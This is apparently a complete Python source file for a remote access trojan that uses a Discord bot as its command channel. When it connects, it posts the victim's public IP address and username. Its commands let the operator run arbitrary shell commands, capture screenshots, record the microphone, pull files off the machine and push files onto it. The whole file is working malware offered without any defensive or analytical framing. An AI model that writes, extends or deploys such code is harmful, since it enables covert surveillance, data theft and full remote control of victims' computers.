import discord
from discord.ext import commands
import time
import subprocess
import pyautogui
import random
from concurrent.futures import ThreadPoolExecutor
import pyaudio
import wave
import os


client = commands.Bot(command_prefix="!", intents=discord.Intents.all())
executor = ThreadPoolExecutor(max_workers=1)
audio_file_path = 'audio.wav'


def record_audio():
    if os.path.exists(audio_file_path):
        os.remove(audio_file_path)
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100
    RECORD_SECONDS = 11

    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
    frames = []

    for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
        data = stream.read(CHUNK)
        frames.append(data)

    stream.stop_stream()
    stream.close()
    p.terminate()

    wf = wave.open(audio_file_path, 'wb')
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(p.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()
    return {'status': 'success'}


def start_recording():
    executor.submit(record_audio)
    return {'status': 'success'}


def take_screenshot(file_path):
    screenshot = pyautogui.screenshot()
    screenshot.save(file_path)


def remove_screenshot(file_path):
    os.remove(file_path)


@client.event
async def on_ready():
    guild = client.guilds[0]
    channel_name = f'{random.randint(100000000, 999999999)}-sess'
    channel = await guild.create_text_channel(channel_name)
    message_content = "@everyone Connection made!"
    await channel.send(message_content)
    await channel.send(f"""```Public IP: {os.popen('curl ifconfig.me').read()}```""")
    await channel.send(f"""```User: {os.popen('whoami').read()}```""")
    global bot_channel_id
    bot_channel_id = channel.id


@client.command(help="End process and delete session channel")
async def kill(ctx):
    channel = client.get_channel(int(bot_channel_id))
    if channel:
        await channel.delete()
    exit()


@client.command(help="Screenshot the host's screen")
async def screenshot(ctx):
    if ctx.channel.id != bot_channel_id:
        return
    path = str(random.randint(10000000000000000, 9999999999999999999999)) + ".png"
    take_screenshot(path)
    with open(path, 'rb') as f:
        pic = discord.File(f)
        await ctx.send(file=pic)
    remove_screenshot(path)


@client.command(help="Execute shell commands on the host machine")
async def shell(ctx, *, command):
    if ctx.channel.id != bot_channel_id:
        return
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    output, error = process.communicate()
    if output != b'' or error != b'':
        await ctx.send(f"""```{output.decode()}{error.decode()}```""")


@client.command(help="Record a host's microphone for 10 seconds")
async def record(ctx):
    if ctx.channel.id != bot_channel_id:
        return
    start_recording()
    time.sleep(12)
    with open('audio.wav', 'rb') as f:
        audio = discord.File(f)
        await ctx.send(file=audio)
    os.remove('audio.wav')


@client.command(help="Download files from the host machine")
async def download(ctx, filename):
    if ctx.channel.id != bot_channel_id:
        return
    with open(filename, 'rb') as f:
        file = discord.File(f)
        await ctx.send(file=file)


@client.command(help="Upload files to the host machine (while attaching a file: !upload)")
async def upload(ctx):
    if ctx.channel.id != bot_channel_id:
        return
    if len(ctx.message.attachments) == 0:
        await ctx.send("No file attached.")
        return

    attachment = ctx.message.attachments[0]

    await attachment.save(attachment.filename)

    await ctx.send(f"File '{attachment.filename}' successfully uploaded.")


client.run("YOUR_TOKEN")
